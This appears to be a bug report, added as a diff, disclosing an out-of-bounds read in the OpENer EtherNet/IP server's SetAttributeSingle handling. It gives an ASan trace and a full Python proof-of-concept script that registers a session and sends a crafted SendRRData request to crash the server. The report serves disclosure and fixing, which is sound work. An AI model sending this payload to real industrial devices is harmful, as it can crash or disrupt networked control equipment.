@@ -1,0 +1,110 @@
+issue #569
+
+Summary
+
+I found a remotely reachable server-side out-of-bounds read in the current master branch of OpENer.
+
+The issue is reachable through the real unconnected explicit-message path:
+
+RegisterSession -> SendRRData -> CPF -> Message Router -> SetAttributeSingle -> reachable attribute decoder -> GetUintFromMessage / GetUsintFromMessage
+
+This is not the same crashing condition as the previously reported DecodePaddedEPath() parser-side OOB read. In this case, the request successfully passes path decoding, reaches a real settable attribute in the default build, and the final out-of-bounds read occurs inside the attribute decoder because request-data length is not validated before attribute->decode(...) is invoked.
+
+I reproduced this against the default POSIX server build on TCP/44818 using a Python PoC that first performs RegisterSession and then sends a crafted SendRRData request. The crash is ASan-confirmed as a stack-buffer-overflow read.
+
+ASan
+
+==68203==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffcd4e17070
+READ of size 1 at 0x7ffcd4e17070 thread T0
+    #0  GetUintFromMessage .../source/src/enet_encap/endianconv.c:75
+    #1  DecodeCipTcpIpInterfaceEncapsulationInactivityTimeout .../source/src/cip/ciptcpipinterface.c:519
+    #2  SetAttributeSingle .../source/src/cip/cipcommon.c:823
+    #3  NotifyClass .../source/src/cip/cipcommon.c:127
+    #4  NotifyMessageRouter .../source/src/cip/cipmessagerouter.c:217
+    #5  NotifyCommonPacketFormat .../source/src/enet_encap/cpf.c:60
+    #6  HandleReceivedSendRequestResponseDataCommand .../source/src/enet_encap/encap.c:558
+    #7  HandleReceivedExplictTcpData .../source/src/enet_encap/encap.c:186
+    #8  HandleDataOnTcpSocket .../source/src/ports/generic_networkhandler.c:864
+
+PoC
+
+#!/usr/bin/env python3
+import socket
+import struct
+import sys
+
+
+HOST = "127.0.0.1"
+PORT = 44818
+
+
+TARGETS = {
+    "tcpip13": (0xF5, 0x01, 0x0D),  # TCP/IP interface instance 1 attr 13
+    "qos8": (0x48, 0x01, 0x08),     # QoS instance 1 attr 8
+}
+
+
+def encap(command: int, session: int, payload: bytes, context: bytes = b"ABCDEFGH") -> bytes:
+    return struct.pack("<HHII8sI", command, len(payload), session, 0, context, 0) + payload
+
+
+def register_session(sock: socket.socket) -> int:
+    sock.sendall(encap(0x0065, 0, struct.pack("<HH", 1, 0)))
+    response = sock.recv(1024)
+    if len(response) < 8:
+        raise RuntimeError(f"short RegisterSession response: {response.hex()}")
+    return struct.unpack_from("<I", response, 4)[0]
+
+
+def build_cip_setattrsingle(class_id: int, instance_id: int, attribute_id: int) -> bytes:
+    path_size_words = 235
+    member_words = path_size_words - 3
+    path = bytes(
+        [path_size_words, 0x20, class_id, 0x24, instance_id, 0x30, attribute_id]
+        + [0x28, 0x00] * member_words
+    )
+    return bytes([0x10]) + path
+
+
+def build_send_rr_data(session: int, cip: bytes) -> bytes:
+    cpf = struct.pack(
+        "<IHHHHHH",
+        0,          # interface handle
+        0,          # timeout
+        2,          # item count
+        0x0000,     # Null Address Item
+        0x0000,     # Null Address length
+        0x00B2,     # Unconnected Data Item
+        len(cip),
+    ) + cip
+    return encap(0x006F, session, cpf)
+
+
+def main() -> int:
+    target_name = sys.argv[1] if len(sys.argv) > 1 else "tcpip13"
+    if target_name not in TARGETS:
+        print(f"usage: {sys.argv[0]} [{'|'.join(TARGETS)}]", file=sys.stderr)
+        return 2
+
+    class_id, instance_id, attribute_id = TARGETS[target_name]
+    cip = build_cip_setattrsingle(class_id, instance_id, attribute_id)
+    packet = build_send_rr_data(0, cip)
+
+    print(f"target={target_name} cip_len={len(cip)} packet_len={len(packet)}")
+
+    with socket.create_connection((HOST, PORT), timeout=2.0) as sock:
+        session = register_session(sock)
+        print(f"session={session}")
+        packet = build_send_rr_data(session, cip)
+        sock.sendall(packet)
+        try:
+            response = sock.recv(1024)
+            print(f"response_len={len(response)} response={response.hex()}")
+        except socket.timeout:
+            print("response=timeout")
+
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
